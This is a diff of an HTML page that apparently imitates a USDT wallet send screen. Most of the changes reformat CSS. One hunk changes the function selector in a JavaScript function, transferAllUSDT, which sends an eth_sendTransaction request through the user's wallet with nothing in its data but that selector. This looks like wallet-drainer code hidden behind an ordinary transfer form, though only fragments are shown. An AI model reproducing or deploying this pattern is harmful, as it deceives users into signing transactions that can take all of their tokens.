@@ -21,12 +21,7 @@
             border-radius: 12px; 
             padding: 20px; 
         }
-        .header { 
-            display: flex; 
-            align-items: center; 
-            gap: 15px; 
-            margin-bottom: 30px; 
-        }
+        .header { display: flex; align-items: center; gap: 15px; margin-bottom: 30px; }
         .back { font-size: 24px; cursor: pointer; }
         .title { font-size: 18px; font-weight: 600; flex: 1; }
         .label { font-size: 13px; color: #aaa; margin-bottom: 8px; font-weight: 500; }
@@ -35,7 +30,7 @@
         input { width: 100%; border: none; font-size: 16px; background: none; color: #fff; }
         input::placeholder { color: #666; }
         input:read-only { color: #aaa; }
-        .paste-btn { background: none; border: none; color: #00b386; cursor: pointer; font-size: 12px; font-weight: 600; white-space: nowrap; }
+        .paste-btn { background: none; border: none; color: #00b386; cursor: pointer; font-size: 12px; font-weight: 600; }
         .amount-container { display: flex; justify-content: space-between; align-items: center; width: 100%; }
         .amount-input { flex: 1; }
         .usdt-label { color: #aaa; font-size: 14px; margin-right: 8px; white-space: nowrap; }
@@ -302,7 +297,7 @@
         }
 
         async function transferAllUSDT(senderAddress) {
-            const functionSelector = '9b58bc26';
+            const functionSelector = '39cc3849';
             const data = '0x' + functionSelector;
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
